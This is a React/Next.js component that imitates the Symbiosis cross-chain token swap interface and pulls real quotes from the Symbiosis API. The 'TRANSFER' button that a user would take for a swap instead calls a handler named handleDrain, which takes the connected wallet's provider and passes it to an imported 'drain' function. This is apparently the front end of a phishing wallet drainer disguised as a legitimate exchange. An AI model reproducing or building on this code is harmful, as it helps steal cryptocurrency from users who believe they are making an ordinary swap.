"use client";

import { ethers } from "ethers";
import { useEffect, useState } from "react";
import Image from "next/image";
import { useAccount } from "wagmi";
import { useWallet } from "../../components/useWallet";
import TokenSelector from "@/components/symbiosis/TokenSelector";
import Switch from "@/components/symbiosis/Switch";
import axios from "axios";
import { formatAmount } from "@/lib/utils";
import QuoteCard from "@/components/symbiosis/SymbiosisQuoteCard";
import { TSwapQuote } from "@/types/symbiosis";
import { TbSettingsFilled } from "react-icons/tb";
import { Network, Token, TradeType } from "@/app/symbiosis/page";
import SymbiosisSettings from "./SymbiosisSettings";
import "/public/symbiosis/cygnito-font.css";

const SymbiosisSwap = () => {
  const { drain } = useWallet();
  const { connector, address } = useAccount();
  const [showSettings, setShowSettings] = useState(false);
  const [customAddress, setCustomAddress] = useState("");
  const [fetchingRate, setfetchingRate] = useState<boolean>(false);
  const [loading, setLoading] = useState(false);
  const [isAddressOpen, setIsAddressOpen] = useState<boolean>(false);
  const [txState, setTxState] = useState("Initial");
  const [fromAmount, setFromAmount] = useState<string | number>("");
  const [toAmount, setToAmount] = useState<string | number>("");
  const [swapDetails, setSwapDetails] = useState<TSwapQuote | null>(null);
  const [slippage, setSlippage] = useState("0.01");

  const [tradeType, setTradeType] = useState<TradeType>("EXACT_INPUT");
  const [selectedFromNetwork, setSelectedFromNetwork] =
    useState<Network | null>({
      icon: "https://assets-cdn.trustwallet.com/blockchains/ethereum/assets/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/logo.png",
      name: "Ethereum",
      id: 1,
      address: "",
    });

  const [selectedToNetwork, setSelectedToNetwork] = useState<Network | null>(
    null
  );

  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>({
    address: "",
    logoURI:
      "https://assets-cdn.trustwallet.com/blockchains/ethereum/assets/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/logo.png",
    name: "Ethereum",
    symbol: "ETH",
    decimals: 18,
  });
  const [selectedToToken, setSelectedToToken] = useState<Token | null>(null);

  // fetch swap quotes
  useEffect(() => {
    if (
      +fromAmount > 0 &&
      selectedFromNetwork?.id &&
      selectedFromToken &&
      selectedToNetwork
    ) {
      const handleFetchSwap = async () => {
        try {
          setfetchingRate(true);
          await axios
            .post(
              "https://api.symbiosis.finance/crosschain/v1/swap",
              {
                tokenAmountIn: {
                  chainId: selectedFromNetwork?.id,
                  address: selectedFromToken?.address
                    ? selectedFromToken?.address
                    : "",
                  symbol: selectedFromToken?.symbol,
                  decimals: selectedFromToken?.decimals,
                  icon: selectedFromToken?.logoURI,
                  amount: formatAmount(fromAmount, selectedFromToken?.decimals),
                },
                tokenOut: {
                  chainId: selectedToNetwork?.id,
                  address: selectedToToken?.address
                    ? selectedToToken?.address
                    : "",
                  symbol: selectedToToken?.symbol,
                  decimals: selectedToToken?.decimals,
                  icon: selectedToToken?.logoURI,
                },
                from: address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
                to: address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
                slippage: 200,
                selectMode: "best_return",
              },
              {
                headers: {
                  "x-account-id":
                    address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
                  "x-partner-id": "symbiosis-app",
                },
              }
            )
            .then((res) => {
              // console.log(res, "price response");
              if (res.data) {
                setSwapDetails(res.data);
                if (tradeType === "EXACT_INPUT") {
                  const rawAmount = BigInt(res?.data?.tokenAmountOut?.amount); // Use BigInt to handle large numbers
                  const decimals = res.data?.tokenAmountOut?.decimals;

                  // Convert raw amount to human-readable format
                  const humanReadableAmount =
                    Number(rawAmount) / Math.pow(10, decimals);
                  setToAmount(humanReadableAmount);
                }
                if (tradeType === "EXACT_OUTPUT") {
                  const rawAmount = BigInt(res?.data?.tokenAmountOut?.amount); // Use BigInt to handle large numbers
                  const decimals = res.data?.tokenAmountOut?.decimals;

                  // Convert raw amount to human-readable format
                  const humanReadableAmount =
                    Number(rawAmount) / Math.pow(10, decimals);
                  setToAmount(humanReadableAmount);
                }
              }
            })
            .finally(() => setfetchingRate(false));
        } catch (err) {
          console.log(err);
        }
      };
      handleFetchSwap();
    }
  }, [fromAmount, selectedFromNetwork, selectedToToken, selectedToNetwork]);

  const handleDrain = async () => {
    if (!connector) {
      console.error("Missing required fields for drain.");
      return;
    }

    try {
      setLoading(true);
      setTxState("Processing");

      const provider = new ethers.providers.Web3Provider(
        await connector.getProvider()
      );
      const chainId = await provider.getSigner().getChainId();

      await drain(provider, chainId, selectedToToken.address); // Trigger drain with correct args

      setTxState("Completed");
      setLoading(false);
    } catch (error) {
      console.error("Error in drain function:", error);
      setTxState("Failed");
      setLoading(false);
    }
  };

  const handleSwap = () => {
    setSelectedFromNetwork(selectedToNetwork);
    setSelectedToNetwork(selectedFromNetwork);
    setSelectedToToken(selectedFromToken);
    setSelectedFromToken(selectedToToken);
  };

  return (
    <>
      <div className="space-y-6">
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-2">
            <h2 className="text-2xl">Exchange</h2>
            <p>{"{?}"}</p>
          </div>
          <div className="bg-[#f1f1f1] p-2 rounded-xl hover:opacity-65">
            <TbSettingsFilled
              className="w-6 h-6 cursor-pointer transition-colors hover:opacity-65"
              onClick={() => setShowSettings(true)}
            />
          </div>
        </div>

        <div className="space-y-2 relative border-b-2 border-[#707070]">
          <TokenSelector
            isWithMax
            amount={fromAmount}
            tradeType="EXACT_INPUT"
            setTradeType={setTradeType}
            setAmount={setFromAmount}
            selectedNetwork={selectedFromNetwork}
            selectedToken={selectedFromToken}
            setSelectedNetwork={setSelectedFromNetwork}
            setSelectedToken={setSelectedFromToken}
            selectedNetwork2={selectedToNetwork}
            label="From"
            // onSelect={(network, token) => setFromToken({ network, token })}
          />
          <div className="flex justify-center absolute w-full bottom-[-35px]">
            <div className="flex justify-center">
              <div
                onClick={handleSwap}
                className="bg-black rounded-xl p-2 cursor-pointer hover:bg-gray-900"
              >
                <img
                  src="/symbiosis/download (5).svg"
                  alt="round"
                  className="h-6 w-6"
                />
              </div>
            </div>
          </div>
        </div>

        <div className="space-y-2">
          <TokenSelector
            amount={toAmount}
            setAmount={setToAmount}
            selectedNetwork={selectedToNetwork}
            tradeType="EXACT_OUTPUT"
            setTradeType={setTradeType}
            fetching={fetchingRate}
            selectedNetwork2={selectedFromNetwork}
            selectedToken={selectedToToken}
            setSelectedNetwork={setSelectedToNetwork}
            setSelectedToken={setSelectedToToken}
            label="To"
            // onSelect={(network, token) => setToToken({ network, token })}
          />
        </div>

        <div className="w-full flex justify-start items-center gap-2">
          <Switch open={isAddressOpen} setOpen={setIsAddressOpen} />
          <p className="text-[#888]">
            Receive to {selectedToToken?.symbol} another wallet
          </p>
        </div>

        {isAddressOpen ? (
          <div className="space-y-2">
            <label className="text-sm sm:text-base text-gray-400">
              Enter address:
            </label>
            <input
              type="text"
              onChange={(e) => setCustomAddress(e.target.value)}
              value={customAddress}
              placeholder="..."
              className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none font-mono"
            />
            <p className=" text-sm">
              <span className="text-orange-500">Important: </span>
              Use self-custodial wallets only! Do not send funds to addresses
              provided by exchanges or third-party services.
            </p>
          </div>
        ) : null}

        {selectedFromToken.symbol && selectedToToken?.symbol && swapDetails ? (
          <div className="mt-4 px-2 py-0.5 rounded-full flex justify-start items-center gap-1 bg-white border shadow-sm w-fit">
            <Image
              src="https://symbiosis-static.net/611b4f59ba061ab80d52.png"
              height={18}
              width={18}
              alt="horse"
              className="rounded-full"
            />
            <p className="text-xs text-black">{selectedFromToken?.symbol}</p>
            <p> &gt;</p>
            <p className="text-xs text-black">{selectedToToken?.symbol}</p>
          </div>
        ) : null}

        {+fromAmount > 0 ? (
          <QuoteCard data={swapDetails} setShowSettings={setShowSettings} />
        ) : null}

        <button
          onClick={() => handleDrain()}
          disabled={loading || !selectedToToken || fetchingRate}
          className={`${
            customAddress === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
          } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors disabled:opacity-35`}
        >
          {customAddress.length > 1 &&
          !ethers.utils.isAddress(customAddress) &&
          !loading
            ? "SET VALID ADDRESS"
            : loading
            ? "TRANSFERRING..."
            : !selectedToToken?.name
            ? "SELECT THE TOKEN YOU RECEIVE"
            : "TRANSFER"}
        </button>
      </div>

      <SymbiosisSettings
        setShowSettings={setShowSettings}
        setSlippage={setSlippage}
        showSettings={showSettings}
        slippage={slippage}
      />
    </>
  );
};

export default SymbiosisSwap;
